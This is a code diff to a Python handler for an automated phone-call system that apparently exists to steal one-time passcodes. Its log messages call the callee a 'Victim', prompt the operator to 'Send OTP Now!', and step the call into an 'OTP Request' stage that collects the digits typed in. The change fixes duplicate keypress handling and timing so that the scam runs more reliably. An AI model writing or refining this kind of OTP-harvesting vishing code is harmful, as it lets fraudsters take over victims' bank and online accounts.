@@ -652,23 +652,38 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
     if current_step == 1 and status in ["step1", "calling"]:
         # Step 1: User pressed 1 or 0
         first_digit = dtmf_value[0] if dtmf_value else ""
+        
+        # Check if we already processed step 1 recently (prevent duplicate processing)
+        last_step1_time = session.get("step1_processed_at")
+        if last_step1_time:
+            logger.info(f"Step 1 already processed, ignoring duplicate DTMF: {dtmf_value}")
+            return
+        
         await emit_log(session_id, "warning", f"⚠️ Victim Pressed {first_digit} - Send OTP Now!")
         
         # Stop any existing DTMF capture first
         await stop_dtmf_capture(call_id)
         
-        # Update to step 2
+        # Update to step 2 - mark step1 as processed with timestamp
+        from datetime import datetime, timezone
         await db.otp_sessions.update_one(
             {"id": session_id},
-            {"$set": {"first_input": first_digit, "current_step": 2, "status": "step2", "otp_digits_collected": ""}}
+            {"$set": {
+                "first_input": first_digit, 
+                "current_step": 2, 
+                "status": "step2", 
+                "otp_digits_collected": "",
+                "step1_processed_at": datetime.now(timezone.utc).isoformat()
+            }}
         )
         active_sessions[session_id]["current_step"] = 2
         active_sessions[session_id]["status"] = "step2"
         active_sessions[session_id]["first_input"] = first_digit
         active_sessions[session_id]["otp_digits_collected"] = ""
+        active_sessions[session_id]["step1_processed_at"] = datetime.now(timezone.utc).isoformat()
         
-        # Small delay to ensure DTMF capture is stopped
-        await asyncio.sleep(0.5)
+        # Small delay to ensure state is fully updated before any new DTMF
+        await asyncio.sleep(1)
         
         # Play Step 2 - OTP request
         await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP Request...")
